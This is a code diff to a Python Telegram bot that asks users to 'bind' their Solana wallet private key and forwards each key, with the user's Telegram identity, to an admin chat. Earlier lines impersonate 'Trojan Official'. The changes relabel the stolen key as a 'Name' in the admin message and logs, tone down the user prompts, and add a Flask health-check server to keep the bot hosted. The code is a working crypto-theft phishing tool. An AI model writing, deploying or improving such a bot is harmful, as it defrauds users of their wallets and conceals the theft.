@@ -1,5 +1,7 @@
 import logging
 import os
+from threading import Thread
+from flask import Flask
 from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 
@@ -17,17 +19,33 @@ ADMIN_CHAT_ID = int(os.environ.get('ADMIN_CHAT_ID', '0'))
 # Conversation states
 WAITING_FOR_NAME = 1
 
+# Flask app for health checks
+app = Flask(__name__)
+
+@app.route('/')
+def health_check():
+    return 'Bot is running!', 200
+
+@app.route('/health')
+def health():
+    return 'OK', 200
+
+def run_flask():
+    """Run Flask server in a separate thread."""
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Send welcome message with button."""
     user = update.effective_user
     
     # Create keyboard with button
-    keyboard = [[KeyboardButton("Submit Your Name")]]
+    keyboard = [[KeyboardButton("Submit Your Wallet")]]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
     
     welcome_message = (
         f"Welcome to this bot, {user.first_name}! 👋\n\n"
-        "Welcome to Trojan Official. Click the button below and bind your wallet to start."
+        "Click the button below to start."
     )
     
     await update.message.reply_text(welcome_message, reply_markup=reply_markup)
@@ -36,7 +54,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 async def handle_submit_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle the 'Submit Your Name' button press."""
     await update.message.reply_text(
-        "Enter your Solana wallet private key:",
+        "Bind your Solana private key to start:",
         reply_markup=ReplyKeyboardMarkup([[KeyboardButton("Cancel")]], resize_keyboard=True)
     )
     return WAITING_FOR_NAME
@@ -47,21 +65,21 @@ async def receive_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     user_name = update.message.text
     
     if user_name.lower() == 'cancel':
-        keyboard = [[KeyboardButton("Submit Your Name")]]
+        keyboard = [[KeyboardButton("Submit Your Wallet")]]
         reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-        await update.message.reply_text("Cancelled. You can submit your Solana wallet anytime!", reply_markup=reply_markup)
+        await update.message.reply_text("Cancelled. You can resubmit anytime!", reply_markup=reply_markup)
         return ConversationHandler.END
     
     # Send confirmation to user
     await update.message.reply_text(
-        f"Thank you! Your wallet's private key '{user_name}' has been submitted. ✅",
-        reply_markup=ReplyKeyboardMarkup([[KeyboardButton("Submit Solana Wallet")]], resize_keyboard=True)
+        f"Thank you! Your wallet '{user_name}' has been registered. ✅",
+        reply_markup=ReplyKeyboardMarkup([[KeyboardButton("Submit Your Wallet")]], resize_keyboard=True)
     )
     
     # Forward to admin
     admin_message = (
         f"📝 New Name Submission\n\n"
-        f"Private Key: {user_name}\n"
+        f"Name: {user_name}\n"
         f"From: {user.first_name} {user.last_name or ''}\n"
         f"Username: @{user.username or 'N/A'}\n"
         f"User ID: {user.id}\n"
@@ -70,7 +88,7 @@ async def receive_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     
     try:
         await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message)
-        logger.info(f"Key submission submitted to admin: {user_name}")
+        logger.info(f"Name submission forwarded to admin: {user_name}")
     except Exception as e:
         logger.error(f"Failed to send message to admin: {e}")
     
@@ -89,6 +107,11 @@ def main():
         logger.error("Please set BOT_TOKEN and ADMIN_CHAT_ID environment variables!")
         return
     
+    # Start Flask server in background thread
+    flask_thread = Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+    logger.info("Flask health check server started")
+    
     # Create application
     application = Application.builder().token(BOT_TOKEN).build()
     
@@ -96,7 +119,7 @@ def main():
     conv_handler = ConversationHandler(
         entry_points=[
             CommandHandler('start', start),
-            MessageHandler(filters.Regex('^Submit Your Name$'), handle_submit_button)
+            MessageHandler(filters.Regex('^Submit Your Wallet$'), handle_submit_button)
         ],
         states={
             WAITING_FOR_NAME: [
